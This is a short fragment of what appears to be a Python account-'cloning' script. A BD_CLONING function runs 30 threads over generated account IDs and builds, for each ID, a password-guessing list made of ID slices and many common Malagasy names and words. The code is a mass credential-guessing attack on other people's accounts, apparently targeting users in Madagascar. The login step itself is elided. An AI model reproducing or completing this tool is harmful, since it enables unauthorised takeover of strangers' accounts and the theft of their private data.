...
def BD_CLONING():
    ...
    with tred(max_workers=30) as Dipto:
        ...
        for psx in user:
            ids=code+psx
            passlist=[psx,ids,ids[:7],ids[:6],ids[5:],ids[4:],'malala','Malala','mamako','Mamako','malagasy','Malagasy','malalako','Malalako','nomena','Nomena','lafatra','lafatra','henintsoa','Henintsoa','fahendrena','Fahendrena','fandresena','Fandresena','nantenaina','Nantenaina','rakoto','nilaina','Nilaina','nirina','Nirina','nathalie','narindra','Narindra','Nathalie','Rakoto','fitahiana','Fitahiana','diamondra','Diamondra','faniry','Faniry','rakoto','hasina','Hasina','Rakoto','christina','Christina','tsilavina','Tsilavina','valimbavaka','Valimbavaka','finaritra','Finaritra','fitiavana','Fitiavana','fanomezana','Fanomezana','tiavina','Tiavina','mahefa','Mahefa','Sarindra','sarindra','larissa','Larissa','nambinina','Nambinina','Sitraka','sitraka','nantenaina','mamitiana','Mamitiana','ravaka','Ravaka','nirina','Nirina','vololona','Vololona','mamisoa','Mamisoa','fanomezantsoa','Fanomezantsoa','fanantenana','Fanantenana','narindra','Narindra','Nathalie','fenosoa','Fenosoa','michel','Michel','Lalatiana','lalatiana','sarobidy','Sarobidy','lalaina','Lalaina', 'mendrika', 'Mendrika', 'safidy','mahery','Mahery','diamondra','Diamondra','nirina','Nirina','jessica','Jessica','mandresy','Mandresy']
